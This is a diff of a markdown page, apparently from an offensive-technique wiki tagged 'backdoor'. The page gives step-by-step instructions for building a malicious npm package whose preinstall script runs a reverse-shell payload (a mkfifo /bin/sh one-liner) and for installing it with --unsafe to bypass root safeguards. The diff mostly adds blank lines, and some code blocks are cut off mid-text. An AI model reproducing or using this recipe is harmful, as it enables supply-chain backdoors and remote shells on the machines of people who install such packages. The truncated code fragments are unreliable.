@@ -32,41 +32,103 @@ Nodejs' package manager npm can executes commands while it installs a package, g
 
 Nodejs' package manager npm can executes commands while it installs a package, giving attackers an opportunity to create malicious packages which execute their code. While npm has controls to mitigate this vulnerability when run with root privileges, installing the package with the `--unsafe` flag will disable them.
 
+
+
 # Instructions
 
 1. Select a payload. Suggested:
 
+
+
+
+
 **Code**: [[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1]]
+
+
+
+
 
 2. Create a new directory for the package, then initialize it.
 
+
+
 **Code**: [[mkdir -p pwnme && cd pwnme && npm init]]
+
+
 
 3. Modify package.json, adding an entry for `preinstall` and the payload. in the `scripts` section.
 
+
+
 Before:
+
+
 
 **Code**: [[{
   "name": "pwnme",
   "version": "1.0.0",
   "desc]]
+
+
 
 After:
 
+
+
+
+
 **Code**: [[{
   "name": "pwnme",
   "version": "1.0.0",
   "desc]]
 
+
+
 Note: Do not forget to add a comma after the 'test' entry.
 
+
+
 4. Install the package. Use `--unsafe` if installing the package with root privileges.
+
+
+
+
 
 **Command** ([[npm Install a Package with Preinstall Scripts]]):
 
 ```bash
 npm i $PACKAGE --unsafe
 ```
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
 ## Platforms
 
@@ -89,3 +151,5 @@ npm i $PACKAGE --unsafe
 ## Tags
 
 - [[backdoor]]
+
+
